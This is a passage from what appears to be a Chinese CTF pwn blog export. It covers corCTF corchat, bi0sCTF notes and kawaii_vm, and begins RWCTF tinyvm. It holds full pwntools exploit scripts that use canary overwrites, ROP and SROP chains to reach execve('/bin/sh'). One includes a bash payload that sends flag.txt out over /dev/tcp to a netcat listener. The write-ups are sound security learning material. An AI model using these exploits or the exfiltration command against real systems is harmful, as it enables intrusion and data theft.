&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Something went wrong spawning the process!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (feof(p) == <span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;c, <span class="keyword">sizeof</span>(c), <span class="number">1</span>, p);</span><br><span class="line">        <span class="keyword">if</span> (send(fd, &amp;c, <span class="keyword">sizeof</span>(c), <span class="number">0</span>) &lt;= <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pclose(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的popen()实际上和system()类似，都会启动一个新的进程。但是我们无法直接调用它(因为也要输出code的偏移)。但是很巧妙的是，我们可以通过partial write来处理。注意在<code>RecvCrusaderMessages</code>中，有以下代码片段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(buffer, <span class="string">&quot;GETSTATUS&quot;</span>) == <span class="number">0</span> &amp;&amp; cur_crusader-&gt;is_admin == <span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">    DoAdmin(<span class="string">&quot;top -n 1&quot;</span>, cur_crusader-&gt;m_sock_fd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(buffer, <span class="string">&quot;_SEND_MSG&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    msg = cur_crusader-&gt;RecvMessage();</span><br><span class="line">    <span class="keyword">if</span> (msg == <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;m_connected_crusaders &gt; <span class="number">1</span>)</span><br><span class="line">        ctx-&gt;BroadcastMsg(cur_crusader, msg.c_str(), msg.length(), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这使得我们覆盖上面第八行<code>RecvMessage</code>的返回地址之后，距离第四行<code>doAdmin</code>的距离很近(很巧妙，不过泄露libc也可以)并且不用爆破一位就可以完成。如下所示。注意到上面<code>call doAdmin</code>的末尾和当前ret的末尾相差只有一个byte。所以只需要覆盖一位即可。</p><p><img src="/2023/01/26/corctf2022-corchat/image-20230126202227346.png" alt="image-20230126202227346"></p><p><img src="/2023/01/26/corctf2022-corchat/image-20230126202537719.png" alt="image-20230126202537719"></p><h2 id="多线程调试"><a href="#多线程调试" class="headerlink" title="多线程调试"></a>多线程调试</h2><p>因为这道题调试的时候需要跳到子线程，参考<a href="https://undo.io/resources/gdb-watchpoint/debugging-multithreaded-programs-gdb/">这篇文章</a>编写以下脚本，就可以完成调试。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb_script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">thread 2 (到第二个线程，使用info threads查看线程)</span></span><br><span class="line"><span class="string">set scheduler-locking on (防止切换)</span></span><br><span class="line"><span class="string">brva 0x6216</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>下面是<code>info threads</code>的输出。可以看到还是能很明显的看出线程之间的对应关系的。主线程一直卡在<code>accept</code>的地方。如果不用多线程调试会发现一直卡在这里。</p><p><code>info threads</code></p><p><img src="/2023/01/26/corctf2022-corchat/image-20230126192912929.png" alt="image-20230126192912929"></p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>exp里面使用了反向shell来传递信息。因为bash好像没法打印==。反向shell创建方法<code>nc -lvnp 50000</code>先开启监听，之后换一个终端运行脚本就能在之前的shell上看到输出的消息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">filename=<span class="string">&quot;./corchat_server&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;./corchat_server&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>])</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">host = socket.gethostname()</span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s.connect((host, port))</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line">bias_master_canary = <span class="number">3448</span> <span class="comment"># bias from start</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&quot;brva 0x60B2&quot;</span>) <span class="comment"># b recvname</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overwrite_master_canary</span>(<span class="params">i</span>):</span><br><span class="line">    change_name = <span class="string">&quot;_SEND_MSG&quot;</span></span><br><span class="line">    s.send(change_name.encode())</span><br><span class="line">    s.send(<span class="string">b&#x27;\x01\x00&#x27;</span>)</span><br><span class="line">    s.send(<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">    s.send(<span class="string">b&quot;a&quot;</span>*(<span class="number">1024</span>)+p16(<span class="number">0</span>)+p16(bias_master_canary+i)+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">5</span>+i)) <span class="comment"># overwrite master canary</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    overwrite_master_canary(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb_script = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">thread 2</span></span><br><span class="line"><span class="string">set scheduler-locking on</span></span><br><span class="line"><span class="string">brva 0x6216</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x60b2&quot;)</span></span><br><span class="line"><span class="comment"># gdb.attach(io, gdb_script)</span></span><br><span class="line">payload_catflag = <span class="string">b&quot;/bin/bash -c &#x27;cat ./flag.txt &gt; /dev/tcp/0.0.0.0/50000&#x27;\x00&quot;</span></span><br><span class="line">change_name = <span class="string">&quot;_SEND_MSG&quot;</span></span><br><span class="line"><span class="comment"># input(&quot;1 &gt;&quot;)</span></span><br><span class="line">payload = change_name.encode() + <span class="string">b&#x27;\x01\x00&#x27;</span> + <span class="string">b&#x27;\x00\x00&#x27;</span> +payload_catflag+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">1024</span>-<span class="built_in">len</span>(payload_catflag))+p16(<span class="number">0</span>)+p16(bias_master_canary+<span class="number">2</span>)+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">5</span>+<span class="number">7</span>+<span class="number">16</span>) + p64(<span class="number">0xdeadbeef</span>)+<span class="string">b&#x27;\x11&#x27;</span></span><br><span class="line">s.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本地测试结果</p><p><img src="/2023/01/26/corctf2022-corchat/image-20230126215447782.png" alt="image-20230126215447782"></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bi0sctf-2023</title>
      <link href="/2023/01/24/bi0sctf-2023/"/>
      <url>/2023/01/24/bi0sctf-2023/</url>
      
        <content type="html"><![CDATA[<p>2023的bi0sctf！虽然还是卡在了第一个pwn题，但是题目也算是有意思。(还是挺难的)</p><span id="more"></span><h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><h2 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h2><p>在main()里面，产生两个线程。一个线程用来进行heap相关操作，增删改查，另一个用来把heap中输入的内容复制到一个本地的临时变量中。</p><p><img src="/2023/01/24/bi0sctf-2023/image-20230124122608595.png" alt="image-20230124122608595"></p><p>其实还是相当明显的，是一个条件竞争问题。在start_routine中，有一个明显的TOCTOU栈溢出。当检查完size之后，可以很快的在sleep的同时，修改content，导致后面memcpy()的时候栈溢出。尽管这里有一个enc()，但是他是可逆的，并且我们也不太需要关注。因为完全可以在sleep(1u)这个时间点把内容copy到本地栈上去。</p><p><img src="/2023/01/24/bi0sctf-2023/image-20230124122704447.png" alt="image-20230124122704447"></p><p>但是在getshell的时候会出现一些问题。首先是泄露libc，并不能找到很好的泄露函数。而如果直接syscall，则找不到简单的控制rax==0x3b的方法，无法调用<code>execve</code>。这里学到了使用<code>alarm</code>(其实之前见过，忘记了)。当alarm第二次调用时，rax中会储存上一次调用alarm时设置的时间还剩下对少。因此如果我们如下构造ropchain，就能得到一个0x3b的rax。而很巧的是，在栈溢出的时候，rdx和rsi都是0。因此我们也就只剩下rdi需要考虑了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pop rdi</span><br><span class="line"><span class="number">0x3b</span></span><br><span class="line">call alarm</span><br><span class="line">pop rdi</span><br><span class="line"><span class="number">0x3b</span></span><br><span class="line">call alarm <span class="comment"># &lt;--- rax will become 0x3b</span></span><br></pre></td></tr></table></figure><p>对于rdi，我们需要读入一个/bin/sh。程序中<code>print</code>函数正好可以被利用。如下可以看到，由于我们可以通过pip rdi控制输入参数，只要输入一个bss的地址，就可以在这里read(a1,8)的地方读入一个”/bin/sh”。</p><p><img src="/2023/01/24/bi0sctf-2023/image-20230124123815759.png" alt="image-20230124123815759"></p><p>因此，我们只需要做以下几件事情</p><ol><li><p>add一个正常的note</p></li><li><p>sleep(2)来度过另一个线程的sleep和encrypt阶段</p></li><li><p>构造payload</p><ol><li>设置rax</li><li>读入/bin/sh</li><li>布置execve()</li></ol></li><li><p>触发栈溢出</p></li></ol><p>完整payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">filename=<span class="string">&quot;./notes_ori&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;/home/nicholas/glibc-all-in-one/libs/2.34-0ubuntu3.2_amd64/libc.so.6&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">_<span class="built_in">id</span>, name, size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;ID: &quot;</span>)</span><br><span class="line">    io.send(_<span class="built_in">id</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">anti_ciph</span>(<span class="params">content</span>):</span><br><span class="line">    content = content.ljust(<span class="number">0x3ff</span>,<span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line">    result = <span class="string">b&quot;&quot;</span></span><br><span class="line">    secret = <span class="string">&quot;2111485077978050&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1023</span>):</span><br><span class="line">        ans = content[i]^<span class="built_in">ord</span>(key[i%<span class="number">16</span>])</span><br><span class="line">        ans_byte = ans.to_bytes(<span class="number">1</span>,byteorder=<span class="string">&quot;little&quot;</span>)</span><br><span class="line">        result += <span class="built_in">bytearray</span>(ans_byte)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io, <span class="string">&quot;b *0x401B7A&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401bc0</span></span><br><span class="line">syscall = <span class="number">0x401BC2</span></span><br><span class="line"></span><br><span class="line">alarm = <span class="number">0x401060</span></span><br><span class="line">edits = <span class="number">0x00401795</span> <span class="comment"># edit function</span></span><br><span class="line"></span><br><span class="line">bss = elf.bss() + <span class="number">0x500</span> </span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="number">30</span>,<span class="string">&quot;a&quot;</span>) <span class="comment"># pass check</span></span><br><span class="line"><span class="comment"># payload</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*(<span class="number">64</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(edits)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(alarm)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(alarm) <span class="comment"># set rax = 0x3b</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bss)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">add(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="number">0x200</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># write into bss</span></span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Enter Note ID: &quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;//bin/sh\x00&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Note Name: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/01/24/bi0sctf-2023/image-20230124124049171.png" alt="image-20230124124049171"></p><h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>这里还在discord上面看到一种解法，即不适用alarm()来控制rax，而是使用<code>srop</code>。这样只需要在retFrame里面填上相应的数值即可。不过代价是需要的空间更大(100左右字节)。作者的wp如下。这里也是第一次见到srop的这种用法(太菜了…)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">note_id, name, size, data</span>):</span><br><span class="line">    sl(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;ID: &quot;</span>, note_id)</span><br><span class="line">    sla(<span class="string">b&quot;Name: &quot;</span>, name)</span><br><span class="line">    sla(<span class="string">b&quot;Size: &quot;</span>, size)</span><br><span class="line">    sla(<span class="string">b&quot;Content: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">note_id</span>):</span><br><span class="line">    sl(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;ID: &quot;</span>, note_id)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_note</span>(<span class="params">note_id</span>):</span><br><span class="line">    sl(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;ID: &quot;</span>, note_id)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upgrade</span>(<span class="params">size, name</span>):</span><br><span class="line">    sl(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;Size: &quot;</span>, size)</span><br><span class="line">    sla(<span class="string">b&quot;Name: &quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">note_id, data</span>):</span><br><span class="line">    sl(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;ID: &quot;</span>, note_id)</span><br><span class="line">    sla(<span class="string">b&quot;Content: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prepare_enc</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="comment">#print(data.hex())</span></span><br><span class="line">    <span class="keyword">return</span> xor(data, <span class="string">b&quot;2111485077978050&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404100</span></span><br><span class="line">pop_rdi = p64(<span class="number">0x401bc0</span>)</span><br><span class="line">read = p64(<span class="number">0x4013D6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">frame.rip = <span class="number">0x401bc2</span> <span class="comment"># syscall;</span></span><br><span class="line">frame.rax = <span class="number">59</span> <span class="comment"># RT_SIGRETURN</span></span><br><span class="line">frame.rdi = bss <span class="comment"># /bin/sh</span></span><br><span class="line">frame.rsi = <span class="number">0x404200</span> <span class="comment"># NULL</span></span><br><span class="line">frame.rdx = <span class="number">0x404208</span> <span class="comment"># NULL</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">64</span> + p64(<span class="number">0</span>) + pop_rdi + p64(bss) + read + pop_rdi + p64(<span class="number">15</span>) + p64(elf.plt.syscall) + <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&quot;1&quot;</span>, <span class="string">b&quot;pepe&quot;</span>, <span class="number">64</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">64</span>)</span><br><span class="line">encrypt(<span class="string">b&quot;1&quot;</span>, prepare_enc(payload))</span><br><span class="line">sleep(<span class="number">6</span>)</span><br><span class="line">store(<span class="string">b&quot;1&quot;</span>, <span class="string">b&quot;pepe&quot;</span>, <span class="number">64</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">64</span>)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">upgrade(<span class="built_in">len</span>(payload), <span class="string">b&quot;pepe&quot;</span>)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">b&quot;Sent&quot;</span>, <span class="string">b&quot;//bin/sh\x00&quot;</span>)</span><br><span class="line">sl(<span class="string">b&quot;//bin/sh\x00&quot;</span>)</span><br><span class="line">sl(<span class="string">b&quot;//bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="kawaii-vm"><a href="#kawaii-vm" class="headerlink" title="kawaii_vm"></a>kawaii_vm</h1><p>作者的<a href="https://gist.github.com/k1R4/47156c3cf6089e8829475c849ea05e44">writeup</a></p><p>这道题其实利用上只能说是很麻烦，但是用到的技巧并不多。逆向起来会需要一些时间。程序在check中，如果一开始请求的页数是<code>nan</code>（直接输入字符的形式）则会通过很多的检查。如下。包括下面计算的bytes_num，以及后面一页中对于输入语法的check等。</p><p><img src="/2023/01/24/bi0sctf-2023/image-20230125095147269.png" alt="image-20230125095147269"></p><p>在对于语法的check中，会检查当前写入的数组下标是否超过了当时写的数组大小的界限。如果返回true就说明越界了。但是nan使得一直返回false。</p><p><img src="/2023/01/24/bi0sctf-2023/image-20230125095530502.png" alt="image-20230125095530502"></p><p>在exec()中，是一个虚拟机。除了一般的加减乘除之外，还包括对于栈的出入，对于一个array的写入和读取操作。注意到array开始位置在libc上面附近，因此由于我们可以任意长度读取写入，相当于我们就有了对libc的任意读写的能力。作者的libc是2.36的，基本没有FSOP(有<a href="https://blog.kylebot.net/2022/10/22/angry-FSROP/">一篇文章</a>通过angr验证了当前libc中可用的FSOP方法已经不多了)。结合程序开了orw保护，应该只能劫持返回地址了。</p><p>作者给的思路是通过写tcachebins，从而控制malloc返回的地址到可控地址，之后用虚拟机自身指令修改vm的栈指针指向一个栈上地址再做rop。因为libc没有调试符号，不太想做了==</p><p><img src="/2023/01/24/bi0sctf-2023/image-20230125100335357.png" alt="image-20230125100335357"></p><p>这题的收获是逆向起来还是有点意思，以及nan的使用。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VM </tag>
            
            <tag> race_condition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rwctf-tinyvm</title>
      <link href="/2023/01/20/rwctf-tinyvm/"/>
      <url>/2023/01/20/rwctf-tinyvm/</url>
      
        <content type="html"><![CDATA[<p>RWCTF2023的一个签到的vm题目，漏洞不难，但是利用起来很有意思。最后没有独自做出来，参考了ctftime的writeup，也是学到了不少东西</p><span id="more"></span><h1 id="rwctf-tinyvm"><a href="#rwctf-tinyvm" class="headerlink" title="rwctf-tinyvm"></a>rwctf-tinyvm</h1><p>来自rwctf-5th的一道PWN题，是最经典的<code>clone-pwn</code>，比赛结束时分值为180分。网址即为<a href="https://github.com/jakogut/tinyvm">tinyvm</a>的最后一次commit。直接给了源码，按照有DEBUG模式下的makefile编译即可。</p><p>使用makefile的编译选项，得到的结果竟然是没有canary的？这里没办法复现比赛环境，不知道是否也是如此</p><p><img src="/2023/01/20/rwctf-tinyvm/image-20230119184038116.png" alt="image-20230119184038116"></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>在<code>tvmi.c</code>中，是整个vm的main函数。我们直接根据例子所给的<code>prime.vm</code>调试分析一下这个vm。</p><p>首先vm用calloc分配了一些空间，最大的<code>mem_space</code>为0x4000000字节。这段空间将被mmap在堆和libc之间的空间中。</p><p><img src="/2023/01/20/rwctf-tinyvm/image-20230119150350085.png" alt="image-20230119150350085"></p><h3 id="stack初始化"><a href="#stack初始化" class="headerlink" title="stack初始化"></a>stack初始化</h3><p>设置<code>mem-&gt;register[0x7]</code>，应该是模拟出的栈指针指向之前分配出来的memory加上0x200000byte，之后赋值<code>mem-&gt;register[0x6]</code>也是这个内容。查看文档中对于register的说明。这两个寄存器应该分别是rsp和rbp寄存器。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 